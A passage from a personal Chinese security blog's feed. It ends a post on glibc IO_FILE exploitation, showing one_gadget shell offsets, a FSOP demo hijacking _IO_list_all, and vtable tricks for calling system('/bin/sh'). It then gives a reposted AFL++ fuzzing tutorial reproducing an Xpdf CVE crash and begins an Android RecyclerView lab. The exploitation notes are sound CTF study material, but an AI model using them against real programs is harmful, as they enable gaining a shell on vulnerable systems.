p.interactive()<br><br><br><br>connect()<br>pwn()<br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226 execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure><p>stdout_vtable_ptr -&gt; stderr_vtable_ptr - 0x58 (实际上是stderr_vtable_ptr虚表的位置)</p><p>stderr_vtable_ptr -&gt;  one_gadget </p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>File Stream Oriented Programming 面向文件流编程</p><blockquote><p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p></blockquote><p>触发该函数需要绕过</p><blockquote><p>if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</p></blockquote><ul><li>fp-&gt;_mode &lt;= 0</li><li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li></ul><p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p><ol><li><p>当 libc 执行 abort 流程时</p></li><li><p>当执行 exit 函数时</p></li><li><p>当执行流从 main 函数返回时</p></li></ol><p>ctfwiki给的示例很简单，具体利用有house of  orange，后面再说。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mode_offset 0xc0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writeptr_offset 0x28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writebase_offset 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vtable_offset 0xd8</span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>{<br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *list_all_ptr;<br> <br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br> <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+mode_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writeptr_offset)=<span class="hljs-number">0x1</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writebase_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+vtable_offset)=((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>+<span class="hljs-number">24</span>)=<span class="hljs-number">0x41414141</span>;<br>    list_all_ptr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)_IO_list_all;<br> <br>    list_all_ptr[<span class="hljs-number">0</span>]=ptr;<br> <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>glibc 2.24 下 IO_FILE 的利用</p><blockquote><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p></blockquote><h4 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h4><p>由于<a href="https://so.csdn.net/so/search?q=fwrite&amp;spm=1001.2101.3001.7020">fwrite</a>等函数会最终调用io函数，其缓冲区的初地址有buf_base决定，所以如果修改buf_base与buf_end就可以实现任意地址输入。</p><h4 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -> overflow"></a>_IO_str_jumps -&gt; overflow</h4><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个 <code>vtable</code> 不在 check 范围之内。如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。</p><p> 构造条件：</p><blockquote><ol><li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</li><li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</li><li>fp+0xe0指向system地址</li></ol></blockquote><h4 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps -> finish"></a><strong>_IO_str_jumps -&gt; finish</strong></h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"> 条件：<br><br>_IO_buf_base 不为空<br>_flags &amp; _IO_USER_BUF(<span class="hljs-number">0x01</span>) 为假<br>构造：<br><br>_flags = (binsh_in_libc + <span class="hljs-number">0x10</span>) &amp; ~<span class="hljs-number">1</span><br><br>_IO_buf_base = binsh_addr<br><br>_freeres_list = <span class="hljs-number">0x2</span><br><br>_freeres_buf = <span class="hljs-number">0x3</span><br><br>_mode = <span class="hljs-number">-1</span><br><br>vtable = _IO_str_finish - <span class="hljs-number">0x18</span><br><br>fp+<span class="hljs-number">0xe8</span> -&gt; system_addr<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【PWN】IO-FILE的利用&quot;&gt;&lt;a href=&quot;#【PWN】IO-FILE的利用&quot; class=&quot;headerlink&quot; title=&quot;【PWN】IO_FILE的利用&quot;&gt;&lt;/a&gt;【PWN】IO_FILE的利用&lt;/h1&gt;&lt;p&gt;此篇简单的学习一下IO_File的利</summary>
      
    
    
    
    <category term="IO_File" scheme="https://kylinxin.github.io/categories/IO-File/"/>
    
    
    <category term="IO_File" scheme="https://kylinxin.github.io/tags/IO-File/"/>
    
  </entry>
  
  <entry>
    <title>Fuzzing101系列 Exercise 1</title>
    <link href="https://kylinxin.github.io/2023/11/08/Fuzzing101%E7%B3%BB%E5%88%97%20Exercise%201%20-%20Xpdf/"/>
    <id>https://kylinxin.github.io/2023/11/08/Fuzzing101%E7%B3%BB%E5%88%97%20Exercise%201%20-%20Xpdf/</id>
    <published>2023-11-08T15:14:29.000Z</published>
    <updated>2023-11-24T11:10:09.662Z</updated>
    
    <content type="html"><![CDATA[<h1 id="转载-Fuzzing101系列-Exercise-1-Xpdf"><a href="#转载-Fuzzing101系列-Exercise-1-Xpdf" class="headerlink" title="转载 Fuzzing101系列 Exercise 1 - Xpdf "></a>转载 <a href="https://www.cnblogs.com/hetianlab/p/16263090.html">Fuzzing101系列 Exercise 1 - Xpdf </a></h1><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>　Fuzzing101系列包含针对10 个真实目标的10个练习，在练习中一步一步学习Fuzzing技术的知识。</p><p>　模糊测试（Fuzzing/Fuzz）是一种自动化软件测试技术，它基于为程序提供随机或变异的输入值并监视它的异常和崩溃。</p><p>　AFL、libFuzzer 和 HonggFuzz 是现实世界应用中最多的三个模糊器，这三个都是覆盖引导的进化模糊器（Coverage-guided evolutionary fuzzer）。其中</p><ul><li>进化（evolutionary）是一种受进化算法启发的元启发式方法，它基本上包括通过使用选择标准（例如覆盖率）随时间推移初始子集（种子）的进化和变异。</li><li>覆盖引导（Coverage-guided）是指为了增加发现新崩溃的机会，覆盖引导的模糊器收集和比较不同输入之间的代码覆盖率数据，并选择那些导致新执行路径的输入。</li></ul><p>　在这个练习中，我们将fuzz Xpdf PDF 查看器。目的是在 XPDF 3.02 中找到 CVE-2019-13288 的崩溃/PoC。</p><p>　CVE-2019-13288 是一个漏洞，它可能会通过精心制作的文件导致无限递归。由于程序中每个被调用的函数都会在栈上分配一个栈帧，如果一个函数被递归调用这么多次，就会导致栈内存耗尽和程序崩溃。因此，远程攻击者可以利用它进行 DoS 攻击。可以在以下链接中找到有关不受控制的递归漏洞的更多信息：<a href="https://cwe.mitre.org/data/definitions/674.html">https://cwe.mitre.org/data/definitions/674.html</a></p><h2 id="你会学到什么"><a href="#你会学到什么" class="headerlink" title="你会学到什么"></a>你会学到什么</h2><p>　完成本练习后，你将了解使用 AFL 进行 fuzz 的基础，例如：</p><ul><li>使用检测编译目标应用程序</li><li>运行模糊器（afl-fuzz）</li><li>使用调试器 (GDB) 对崩溃进行分类</li></ul><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>　所有练习都在 Ubuntu 20.04.2 LTS 上进行了测试。 我强烈建议您使用相同的操作系统版本以避免不同的模糊测试结果，并在裸机硬件而不是虚拟机上运行 AFL，以获得最佳性能。</p><p>　否则，您可以在此处找到 <a href="https://drive.google.com/file/d/1_m1x-SHcm7Muov2mlmbbt8nkrMYp0Q3K/view?usp=sharing">Ubuntu 20.04.2 LTS</a> 镜像。用户名为 <code>fuzz</code> / <code>fuzz</code>。</p><p>　AFL 使用非确定性测试算法，因此两个模糊测试会话永远不会相同。我强烈建议设置一个固定的种子（<code>-s 123</code>），这样你的模糊测试结果将与本文的结果相似。</p><h2 id="下载并构建目标"><a href="#下载并构建目标" class="headerlink" title="下载并构建目标"></a>下载并构建目标</h2><p>　首先为要进行模糊测试的项目创建一个新目录：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br><span class="hljs-built_in">mkdir</span> fuzzing_xpdf &amp;&amp; <span class="hljs-built_in">cd</span> fuzzing_xpdf/<br></code></pre></td></tr></tbody></table></figure><p>​为了完全准备好环境，需要安装一些额外的工具（make 和 gcc）</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> build-essential<br></code></pre></td></tr></tbody></table></figure><p>​下载 Xpdf 3.02：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dl.xpdfreader.com/old/xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br><span class="hljs-attribute">tar</span> -xvzf xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br></code></pre></td></tr></tbody></table></figure><p>​构建 Xpdf：</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">"$HOME/fuzzing_xpdf/install/"</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></tbody></table></figure><p>​下面对 Xpdf 进行测试，首先下载一些 PDF 示例：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br>mkdir pdf_examples &amp;&amp; cd pdf_examples<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mozilla/</span>pdf.js-sample-files<span class="hljs-regexp">/raw/m</span>aster/helloworld.pdf<br>wget http:<span class="hljs-regexp">//</span>www.africau.edu<span class="hljs-regexp">/images/</span>default/sample.pdf<br>wget https:<span class="hljs-regexp">//</span>www.melbpc.org.au<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/2017/</span><span class="hljs-number">10</span>/small-example-pdf-file.pdf<br></code></pre></td></tr></tbody></table></figure><p>使用以下命令测试 pdfinfo 二进制文件：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdfinfo -box -meta <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples/helloworld.pdf<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://s2.loli.net/2023/11/08/rilUt1cnAmHjsRE.png'><img src="https://s2.loli.net/2023/11/08/rilUt1cnAmHjsRE.png" alt="image.png"></p><h2 id="安装-AFL"><a href="#安装-AFL" class="headerlink" title="安装 AFL++"></a>安装 AFL++</h2><p>​我们将使用最新版本的 AFL++ fuzzer(<a href="https://github.com/AFLplusplus/AFLplusplus">https://github.com/AFLplusplus/AFLplusplus</a>)</p><p>安装依赖项</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> '<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>'|<span class="hljs-params">sed</span> '<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>')</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> '<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>'|<span class="hljs-params">sed</span> '<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>')</span>-dev<br></code></pre></td></tr></tbody></table></figure><p>构建 AFL++</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br>git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-built_in">cd</span> AFLplusplus<br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">"llvm-config-11"</span><br>make distrib<br>sudo make install<br></code></pre></td></tr></tbody></table></figure><p>执行<code>afl-fuzz</code>，查看是否安装成功</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/AHygWpMEkSNC8on.png'><img src="https://s2.loli.net/2023/11/08/AHygWpMEkSNC8on.png" alt="image.png"></p><h2 id="认识-AFL"><a href="#认识-AFL" class="headerlink" title="认识 AFL++"></a>认识 AFL++</h2><p>　AFL 是一个覆盖引导的模糊器（<strong>coverage-guided fuzzer</strong>），这意味着它收集每个变异输入的覆盖信息，来发现新的执行路径和潜在的错误。当源代码可用时，AFL 可以使用插桩（instrumentation），在每个基本块（函数、循环等）的开头插入函数调用。</p><p>　要为我们的目标程序启用检测，我们需要使用 AFL 的编译器编译源代码。</p><p>　首先，我们要清理所有之前编译的目标文件和可执行文件：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -r <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<br>cd <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>xpdf-<span class="hljs-number">3.02</span>/<br>make clean<br></code></pre></td></tr></tbody></table></figure><p>　现在我们将使用 <code>afl-clang-fast</code> 编译器构建 xpdf：</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">"llvm-config-11"</span><br><span class="hljs-attribute">CC</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast <span class="hljs-attribute">CXX</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast++ ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/"</span><br>make<br>make install<br></code></pre></td></tr></tbody></table></figure><p>　现在可以使用以下命令运行 fuzzer：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></tbody></table></figure><p>　每个选项的简要说明</p><ul><li><code>-i</code> 表示输入示例的目录</li><li><code>-o</code> 表示 AFL + + 将存储的变异文件的目录</li><li><code>-s</code> 表示要使用的静态随机种子</li><li><code>@@</code> 是占位符目标的命令行，AFL 将用每个输入文件名替换</li></ul><p>　fuzzer将会对每个不同的输入文件运行 <code>$HOME/fuzzing_xpdf/install/bin/pdftotext &lt;input-file-name&gt; $HOME/fuzzing_xpdf/output</code> 命令</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/rckOi8JKFVDY1NM.png'><img src="https://s2.loli.net/2023/11/08/rckOi8JKFVDY1NM.png" alt="image.png"></p><p>出现错误，根据提示，执行以下操作：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo su<br>echo core &gt;<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>core_pattern<br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></tbody></table></figure><p>　成功运行，等待一段时间后，发现已经有了一个crash</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/ctrJ2zbRDNTVnky.png'><img src="https://s2.loli.net/2023/11/08/ctrJ2zbRDNTVnky.png" alt="image.png"></p><p>可以在<code>$HOME/fuzzing_xpdf/out/</code> 目录中找到这些崩溃文件。一旦发现第一次崩溃，就可以停止fuzzer，上图中已经出现了一个独特的崩溃。根据您的机器性能，最多可能需要一到两个小时才能发生崩溃。</p><p>　为了完成这个练习，下面尝试使用指定的文件重现崩溃，调试崩溃发现问题，并且修复问题。</p><h2 id="重现崩溃"><a href="#重现崩溃" class="headerlink" title="重现崩溃"></a>重现崩溃</h2><p>　在<code>$HOME/fuzzing_xpdf/out/</code>目录下找到 crash 对应的文件。文件名类似于<code>id:000000,sig:11,src:000390,time:103613,execs:71732,op:havoc,rep:16</code></p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/fPOHaDRhst7Wm8p.png'><img src="https://s2.loli.net/2023/11/08/fPOHaDRhst7Wm8p.png" alt="image.png"></p><p>将此文件作为输入传递给 pdftotext</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-string">'/home/fuzz/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt;'</span> <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></tbody></table></figure><p>　它将导致段错误segmentation fault并导致程序崩溃。</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/bhmkIvOftwLgJCT.png'><img src="https://s2.loli.net/2023/11/08/bhmkIvOftwLgJCT.png" alt="image.png"></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>　使用 gdb 找出程序因该输入而崩溃的原因。</p><p>　首先使用调试信息重建 Xpdf 来获得符号堆栈跟踪：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -r <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span>/fuzzing_xpdf/xpdf-3.02/<br>make clean<br>CFLAGS=<span class="hljs-string">"-g -O0"</span> CXXFLAGS=<span class="hljs-string">"-g -O0"</span> ./configure --prefix=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/"</span><br>make<br>make install<br></code></pre></td></tr></tbody></table></figure><p>　然后使用GDB，输入<code>run</code></p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>out<span class="hljs-regexp">/default/</span>crashes<span class="hljs-regexp">/&lt;your_filename&gt; $HOME/</span>fuzzing_xpdf/output<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://s2.loli.net/2023/11/08/toU9EwMYZKaNy8A.png'><img src="https://s2.loli.net/2023/11/08/toU9EwMYZKaNy8A.png" alt="image.png"></p><p>然后输入<code>bt</code>回溯查看栈帧</p><p class='item-img' data-src='https://s2.loli.net/2023/11/08/pugnP3af1XSeZli.png'><img src="https://s2.loli.net/2023/11/08/pugnP3af1XSeZli.png" alt="image.png"></p><p>发现有许多次<code>Parser::getObj</code>的调用，它们似乎表示一个无限递归。如果你去 <a href="https://www.cvedetails.com/cve/cve-2019-13288/">https://www.cvedetails.com/cve/cve-2019-13288/</a> ，你可以看到描述符合我们从 GDB 得到的回溯</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;转载-Fuzzing101系列-Exercise-1-Xpdf&quot;&gt;&lt;a href=&quot;#转载-Fuzzing101系列-Exercise-1-Xpdf&quot; class=&quot;headerlink&quot; title=&quot;转载 Fuzzing101系列 Exercise 1 - X</summary>
      
    
    
    
    <category term="Fuzzing101系列" scheme="https://kylinxin.github.io/categories/Fuzzing101%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="Fuzzing101系列 Exercise 1" scheme="https://kylinxin.github.io/tags/Fuzzing101%E7%B3%BB%E5%88%97-Exercise-1/"/>
    
  </entry>
  
  <entry>
    <title>移动开发实验2：RecycleView和Activity跳转</title>
    <link href="https://kylinxin.github.io/2023/11/07/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C2%EF%BC%9ARecycleView/"/>
    <id>https://kylinxin.github.io/2023/11/07/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C2%EF%BC%9ARecycleView/</id>
    <published>2023-11-07T02:00:00.000Z</published>
    <updated>2023-11-07T04:04:52.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AS类微信界面开发"><a href="#AS类微信界面开发" class="headerlink" title="AS类微信界面开发"></a>AS类微信界面开发</h1><h2 id="功能要求"><a href="#功能要求" class="headerlink" title="功能要求"></a>功能要求</h2><p>1、在任一tab页中实现列表效果；本功能的实现需要使用 recycleview；</p><p>2、将recyclerView的每个item增加点击功能，点击后跳转到一个新的view展示信息</p><h2 id="开发技术"><a href="#开发技术" class="headerlink" title="开发技术"></a>开发技术</h2><p>开发工具：as </p><p>版本：API 24 Android 7.0</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>本次实验目的是实现在任一tab页将recyclerView的每个item增加点击功能，点击后跳转到一个新的view展示信息，固需要采用到以下两点技术</p><blockquote><ol><li>列表的实现需要使用控件recyclerView进行操作，需创建一个单独的放置recyclerview的layout——item.xml文件，另外还需要单独创建每一项的具体内容的layout文件——fragment_txl.xml</li><li>fragment或activity之间的跳转实现采用startActivity()，新版本中如果还需要返回内容可以采用registerForActivityResult()方法，并采用launch()方法进行跳转</li></ol></blockquote><p>总体思路为在layout创建item.xml文件放recyclerview控件，fragment_txl.xml放列表每一项的信息。在txlfragment定义初始化信息并将信息写成数组方便传参，配合Myadapter适配器进行使用，跳转的具体方法采用startActivity()进行跳转，在跳转的详情页面txlDetails接受传过来的intent并显示数据，设置返回按钮用于返回。</p><h2 id="设计过程"><a href="#设计过程" class="headerlink" title="设计过程"></a>设计过程</h2><h3 id="1-编写layout"><a href="#1-编写layout" class="headerlink" title="1.  编写layout"></a>1.  编写layout</h3><h4 id="1-1-在新建的item-xml中添加recycleview"><a href="#1-1-在新建的item-xml中添加recycleview" class="headerlink" title="1.1 在新建的item.xml中添加recycleview"></a><strong>1.1 在新建的item.xml中添加recycleview</strong></h4><p><strong>效果</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/07/O5o2CYQq1kedMth.png'><img src="https://s2.loli.net/2023/11/07/O5o2CYQq1kedMth.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 